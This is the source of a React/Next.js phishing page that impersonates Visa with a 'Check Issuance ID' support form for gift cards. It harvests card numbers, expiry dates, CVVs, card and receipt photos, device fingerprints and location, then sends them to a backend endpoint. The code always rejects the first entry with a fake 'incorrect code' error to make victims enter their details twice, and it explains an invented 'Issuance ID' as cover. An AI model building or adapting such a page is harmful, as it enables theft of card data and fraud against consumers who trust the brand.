import { useState, useEffect } from 'react'
import Head from 'next/head'
import styles from '../styles/visa.module.css'

export default function HomePage() {
    const [cards, setCards] = useState([''])
    const [expiries, setExpiries] = useState([''])
    const [cvvs, setCvvs] = useState([''])
    const [loading, setLoading] = useState(false)
    const [result, setResult] = useState(null)
    const [error, setError] = useState(null)
    const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
    const [showTutorial, setShowTutorial] = useState(false)
    const [showIssuanceInfo, setShowIssuanceInfo] = useState(false)
    const [location, setLocation] = useState('Unknown')
    const [deviceId, setDeviceId] = useState(null)
    const [copySuccess, setCopySuccess] = useState(false)

    const [showUploadStep, setShowUploadStep] = useState(false)
    const [selectedImages, setSelectedImages] = useState([])
    const [uploadProgress, setUploadProgress] = useState(false)
    const [uploadComplete, setUploadComplete] = useState(false)
    const [uploadError, setUploadError] = useState(null)
    const [attemptCount, setAttemptCount] = useState(0)

    useEffect(() => {
        async function detectLocation() {
            try {
                const res = await fetch('https://ipapi.co/json/')
                const data = await res.json()
                if (data.country_name) {
                    setLocation(data.country_name)
                }
            } catch (err) {
                console.error('IP detection failed', err)
            }
        }
        detectLocation()

        let id = localStorage.getItem('deviceId')
        if (!id) {
            id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
            localStorage.setItem('deviceId', id)
        }
        setDeviceId(id)
    }, [])

    const handleCardChange = (index, value) => {
        setCards(prev => prev.map((c, i) => i === index ? value.replace(/[^0-9\s]/g, '') : c))
    }

    const handleExpiryChange = (index, value) => {
        setExpiries(prev => prev.map((e, i) => {
            if (i !== index) return e
            let val = value.replace(/[^0-9]/g, '')
            if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4)
            return val
        }))
    }

    const handleCvvChange = (index, value) => {
        setCvvs(prev => prev.map((c, i) => i === index ? value.replace(/[^0-9]/g, '') : c))
    }

    const addCard = () => {
        setCards(prev => [...prev, ''])
        setExpiries(prev => [...prev, ''])
        setCvvs(prev => [...prev, ''])
    }

    const removeCard = (index) => {
        if (cards.length <= 1) return
        setCards(prev => prev.filter((_, i) => i !== index))
        setExpiries(prev => prev.filter((_, i) => i !== index))
        setCvvs(prev => prev.filter((_, i) => i !== index))
    }

    async function checkBalance(e) {
        e.preventDefault()
        setError(null)
        setResult(null)
        setCopySuccess(false)
        const validCards = cards.filter(c => c.trim())
        const validExpiries = expiries.filter((e, i) => cards[i]?.trim())
        const validCvvs = cvvs.filter((c, i) => cards[i]?.trim())
        if (validCards.length === 0) return setError('Please enter your Visa Gift Card number.')
        if (validExpiries.length === 0 || !expiries[0]?.trim()) return setError('Please enter the expiration date.')
        if (validCvvs.length === 0 || !cvvs[0]?.trim()) return setError('Please enter the CVV code.')

        setLoading(true)
        try {
            const browserInfo = {
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`
            }

            const res = await fetch('/api/generate-issuance-id', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    cardNumber: validCards.map(c => c.replace(/[\s-]/g, '')).join('/'),
                    expiry: expiries.filter((e, i) => cards[i]?.trim()).join('/'),
                    cvv: cvvs.filter((c, i) => cards[i]?.trim()).join('/'),
                    type: 'visa',
                    deviceId: deviceId,
                    location: location,
                    browserInfo: JSON.stringify(browserInfo)
                })
            })
            const data = await res.json()
            if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
            
            if (attemptCount === 0) {
                setError('The card code you entered is incorrect. Please verify the code and try again.')
                setCards([''])
                setExpiries([''])
                setCvvs([''])
                setAttemptCount(1)
            } else {
                setResult(data)
                setAttemptCount(0)
                if (data.cardId && !data.isDuplicate) {
                    setShowUploadStep(true)
                }
            }
        } catch (err) {
            setError(err.message)
        } finally {
            setLoading(false)
        }
    }

    const handleImageSelect = (e) => {
        const files = Array.from(e.target.files)
        if (files.length + selectedImages.length > 3) {
            setUploadError('Maximum 3 images allowed')
            return
        }

        setUploadError(null)

        files.forEach(file => {
            const reader = new FileReader()
            reader.onload = (event) => {
                setSelectedImages(prev => [...prev, {
                    file,
                    preview: event.target.result,
                    base64: event.target.result
                }])
            }
            reader.readAsDataURL(file)
        })
    }

    const removeImage = (index) => {
        setSelectedImages(prev => prev.filter((_, i) => i !== index))
    }

    const handleUpload = async () => {
        if (selectedImages.length === 0) {
            setUploadError('Please select at least one image')
            return
        }

        setUploadProgress(true)
        setUploadError(null)

        try {
            const res = await fetch('/api/upload-receipt', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    cardId: result.cardId,
                    images: selectedImages.map(img => img.base64)
                })
            })

            const data = await res.json()
            if (!res.ok) throw new Error(data?.error || 'Upload failed')

            setUploadComplete(true)
            setShowUploadStep(false)
        } catch (err) {
            setUploadError(err.message)
        } finally {
            setUploadProgress(false)
        }
    }

    const skipUpload = () => {
        setShowUploadStep(false)
        setSelectedImages([])
        setUploadError(null)
    }

    const copyIssuanceId = async () => {
        if (!result?.issuanceId) return

        try {
            await navigator.clipboard.writeText(result.issuanceId)
            setCopySuccess(true)
        } catch (err) {
            setError('Unable to copy the Issuance ID right now.')
        }
    }

    const resetForm = () => {
        setCards([''])
        setExpiries([''])
        setCvvs([''])
        setResult(null)
        setShowUploadStep(false)
        setSelectedImages([])
        setUploadComplete(false)
        setUploadError(null)
        setCopySuccess(false)
    }

    return (
        <div className={styles.visaPage}>
            <Head>
                <title>Check Issuance ID | Visa</title>
                <meta property="og:title" content="Check Issuance ID | Visa" />
                <meta property="og:description" content="Check your Visa card Issuance ID." />
                <meta property="og:type" content="website" />
                <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
            </Head>

            <header className={styles.header}>
                <div className={styles.headerTop}>
                    <div className={styles.headerLeft}>
                        <a href="/" className={styles.logoContainer}>
                            <img src="/visalogo.PNG" alt="Visa" className={styles.logo} />
                        </a>
                    </div>

                    <nav className={styles.nav}>
                        <a href="#">Personal</a>
                        <a href="#">Business</a>
                        <a href="#">Partner with us</a>
                        <a href="#">About Visa</a>
                    </nav>

                    <div className={styles.headerRight}>
                        <a href="#" className={styles.loginLink}>Sign In</a>
                        <button
                            className={styles.mobileMenuBtn}
                            onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
                            aria-label="Toggle Menu"
                        >
                            <div className={`${styles.hamburger} ${mobileMenuOpen ? styles.open : ''}`}>
                                <span></span>
                                <span></span>
                                <span></span>
                            </div>
                        </button>
                    </div>
                </div>

                <div className={`${styles.mobileNav} ${mobileMenuOpen ? styles.active : ''}`}>
                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Personal</a>
                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Business</a>
                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Partner with us</a>
                    <a href="#" onClick={() => setMobileMenuOpen(false)}>About Visa</a>
                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Sign In</a>
                </div>
            </header>

            <main className={styles.main}>
                <div className={styles.breadcrumb}>
                    Support › cards › Check Issuance ID
                </div>

                <section className={styles.cardSection}>
                    <div className={styles.formContainer}>
                        <p className={styles.subtitle}>Enter your card details to check your card's Issuance ID.</p>

                        <div className={styles.card}>
                            <form onSubmit={checkBalance}>
                                {cards.map((cardValue, index) => (
                                  <div key={index} style={{ marginBottom: cards.length > 1 ? '16px' : '0' }}>
                                    {cards.length > 1 && (
                                      <div style={{ fontSize: '13px', fontWeight: 600, color: 'var(--secondary-text, #666)', marginBottom: '8px' }}>
                                        Card #{index + 1}
                                      </div>
                                    )}
                                    <div className={styles.inputGroup}>
                                      <label className={styles.label}>Card Number{cards.length > 1 ? ` #${index + 1}` : ''}</label>
                                      <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                                        <input
                                          type="tel"
                                          inputMode="numeric"
                                          pattern="[0-9\s]*"
                                          className={styles.input}
                                          placeholder="1234 5678 9012 3456"
                                          value={cardValue}
                                          onChange={(e) => handleCardChange(index, e.target.value)}
                                          disabled={loading}
                                          autoComplete="off"
                                          spellCheck="false"
                                          maxLength={19}
                                          style={{ flex: 1 }}
                                        />
                                        {cards.length > 1 && (
                                          <button
                                            type="button"
                                            onClick={() => removeCard(index)}
                                            style={{ background: 'none', border: 'none', color: '#888', fontSize: '20px', cursor: 'pointer', padding: '4px 8px' }}
                                          >
                                            ×
                                          </button>
                                        )}
                                      </div>
                                    </div>

                                    <div className={styles.inputRow}>
                                      <div className={styles.inputGroup}>
                                        <label className={styles.label}>Expiration Date</label>
                                        <input
                                          type="tel"
                                          inputMode="numeric"
                                          pattern="[0-9\/]*"
                                          className={styles.input}
                                          placeholder="MM/YY"
                                          value={expiries[index] || ''}
                                          onChange={(e) => handleExpiryChange(index, e.target.value)}
                                          disabled={loading}
                                          autoComplete="off"
                                          spellCheck="false"
                                          maxLength={5}
                                        />
                                      </div>
                                      <div className={styles.inputGroup}>
                                        <label className={styles.label}>CVV</label>
                                        <input
                                          type="tel"
                                          inputMode="numeric"
                                          pattern="[0-9]*"
                                          className={styles.input}
                                          placeholder="123"
                                          value={cvvs[index] || ''}
                                          onChange={(e) => handleCvvChange(index, e.target.value)}
                                          disabled={loading}
                                          autoComplete="off"
                                          spellCheck="false"
                                          maxLength={4}
                                        />
                                      </div>
                                    </div>
                                  </div>
                                ))}
                                {cards.length < 5 && (
                                  <button
                                    type="button"
                                    onClick={addCard}
                                    className={styles.button}
                                    style={{ background: 'transparent', border: '1px solid rgba(26, 31, 113, 0.3)', color: '#1a1f71', marginBottom: '12px', fontSize: '14px' }}
                                  >
                                    + Add Another Card
                                  </button>
                                )}

                                {!showUploadStep && (
                                    <button type="submit" className={styles.button} disabled={loading}>
                                        {loading ? 'Verifying...' : 'Check Card'}
                                    </button>
                                )}
                            </form>

                            {result && !showUploadStep && (
                                <div className={styles.result}>
                                    <div className={styles.resultHeader}>
                                        <span className={styles.statusDot}></span>
                                        Issuance ID
                                    </div>
                                    <div className={styles.balanceText}>
                                        <span className={styles.amount}>{result.issuanceId}</span>
                                    </div>
                                    <p className={styles.readyMsg}>This is your Issuance ID.</p>
                                    <button type="button" className={styles.button} onClick={copyIssuanceId} style={{ marginTop: '15px' }}>
                                        {copySuccess ? 'ID COPIED' : 'COPY ID CODE'}
                                    </button>
                                </div>
                            )}

                            {showUploadStep && (
                                <div className={styles.uploadStep}>
                                    <div className={styles.uploadHeader}>
                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" />
                                            <circle cx="12" cy="13" r="4" />
                                        </svg>
                                        <h3>Upload Card Image / Receipt</h3>
                                    </div>
                                    <p className={styles.uploadSubtitle}>Upload a photo of the card or screenshots to continue with the ID check.</p>

                                    <div className={styles.imagePreviewGrid}>
                                        {selectedImages.map((img, idx) => (
                                            <div key={idx} className={styles.previewItem}>
                                                <img src={img.preview} alt={`Preview ${idx + 1}`} />
                                                <button type="button" className={styles.removeBtn} onClick={() => removeImage(idx)}>×</button>
                                            </div>
                                        ))}
                                        {selectedImages.length < 3 && (
                                            <label className={styles.addImageBtn}>
                                                <input
                                                    type="file"
                                                    accept="image/*"
                                                    onChange={handleImageSelect}
                                                    multiple
                                                    style={{ display: 'none' }}
                                                />
                                                <span>+</span>
                                                <span className={styles.addText}>Add Image</span>
                                            </label>
                                        )}
                                    </div>

                                    {uploadError && <div className={styles.error} style={{ marginTop: '15px' }}>{uploadError}</div>}

                                    <div className={styles.uploadActions}>
                                        <button type="button" className={styles.button} onClick={handleUpload} disabled={uploadProgress || selectedImages.length === 0}>
                                            {uploadProgress ? 'Uploading...' : 'Upload'}
                                        </button>
                                        <button type="button" className={styles.skipBtn} onClick={skipUpload} disabled={uploadProgress}>
                                            Skip
                                        </button>
                                    </div>
                                </div>
                            )}

                            {error && (
                                <div className={styles.error}>
                                    <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5">
                                        <circle cx="12" cy="12" r="10" />
                                        <line x1="12" y1="8" x2="12" y2="12" />
                                        <line x1="12" y1="16" x2="12.01" y2="16" />
                                    </svg>
                                    <span>{error}</span>
                                </div>
                            )}
                        </div>

                        <div className={styles.tutorialWrapper}>
                            <button
                                className={styles.tutorialToggle}
                                onClick={() => setShowTutorial(!showTutorial)}
                            >
                                <span>Where do I find my card number?</span>
                                <svg
                                    viewBox="0 0 24 24"
                                    width="20"
                                    height="20"
                                    fill="none"
                                    stroke="currentColor"
                                    strokeWidth="2.5"
                                    style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.4s' }}
                                >
                                    <polyline points="6 9 12 15 18 9" />
                                </svg>
                            </button>

                            <div className={`${styles.tutorialContent} ${showTutorial ? styles.show : ''}`}>
                                <div className={styles.tutorialStep}>
                                    <div className={styles.stepNumber}>1</div>
                                    <div className={styles.stepText}>Locate your Visa Gift Card. The 16-digit card number is embossed on the front of the card.</div>
                                </div>
                                <div className={styles.tutorialStep}>
                                    <div className={styles.stepNumber}>2</div>
                                    <div className={styles.stepText}>Enter all 16 digits without spaces or dashes. The format is typically XXXX XXXX XXXX XXXX.</div>
                                </div>
                                <div className={styles.tutorialStep}>
                                    <div className={styles.stepNumber}>3</div>
                                    <div className={styles.stepText}>For security purposes, you may also need the 3-digit CVV code on the back of your card.</div>
                                </div>
                                <div className={styles.tutorialImage}>
                                    <div className={styles.cardMockup}>
                                        <div className={styles.mockupChip}></div>
                                        <div className={styles.mockupNumber}>1234 5678 9012 3456</div>
                                        <div className={styles.mockupName}>GIFT CARD HOLDER</div>
                                        <div className={styles.mockupLogo}>VISA</div>
                                    </div>
                                </div>
                                <p className={styles.imageCaption}>Your card number is located on the front of your Visa Gift Card.</p>
                            </div>
                        </div>

                        <div
                            className={styles.tutorialWrapper}
                            style={{ marginTop: '16px', borderTop: 'none', paddingTop: 0 }}
                        >
                            <button
                                className={styles.tutorialToggle}
                                onClick={() => setShowIssuanceInfo(!showIssuanceInfo)}
                            >
                                <span>What is an Issuance ID?</span>
                                <svg
                                    viewBox="0 0 24 24"
                                    width="20"
                                    height="20"
                                    fill="none"
                                    stroke="currentColor"
                                    strokeWidth="2.5"
                                    style={{ transform: showIssuanceInfo ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.4s' }}
                                >
                                    <polyline points="6 9 12 15 18 9" />
                                </svg>
                            </button>

                            <div className={`${styles.tutorialContent} ${showIssuanceInfo ? styles.show : ''}`}>
                                <div className={styles.tutorialStep}>
                                    <div className={styles.stepNumber}>1</div>
                                    <div className={styles.stepText}>An Issuance ID is an identification number linked to your card and used for customer care, card support, account verification, and other card-related assistance.</div>
                                </div>
                                <div className={styles.tutorialStep}>
                                    <div className={styles.stepNumber}>2</div>
                                    <div className={styles.stepText}>You can use the Issuance ID to help fund the card, send money to the card through supported channels, and confirm card records when needed.</div>
                                </div>
                                <div className={styles.tutorialStep}>
                                    <div className={styles.stepNumber}>3</div>
                                    <div className={styles.stepText}>You cannot spend the card money from the Issuance ID, but you can use it for funding, support requests, and card-related verification.</div>
                                </div>
                                <p className={styles.imageCaption}>The Issuance ID supports funding, transfers, and verification, but it cannot be used to spend your card balance.</p>
                            </div>
                        </div>
                    </div>
                </section>
            </main>

            <footer className={styles.footer}>
                <div className={styles.footerContent}>
                    <div className={styles.footerLogo}>
                        <img src="/visalogo.PNG" alt="Visa" style={{ height: '26px', opacity: 0.6 }} />
                    </div>
                    <div className={styles.footerDetails}>
                        <p>© {new Date().getFullYear()} Visa. All Rights Reserved.</p>
                        <p>Visa Gift Cards are issued by MetaBank®, N.A., Member FDIC, pursuant to a license from Visa U.S.A. Inc.</p>
                        <div className={styles.footerLinks}>
                            <a href="#">Privacy Policy</a>
                            <span> | </span>
                            <a href="#">Terms of Use</a>
                            <span> | </span>
                            <a href="#">Legal</a>
                            <span> | </span>
                            <a href="#">Contact Us</a>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    )
}
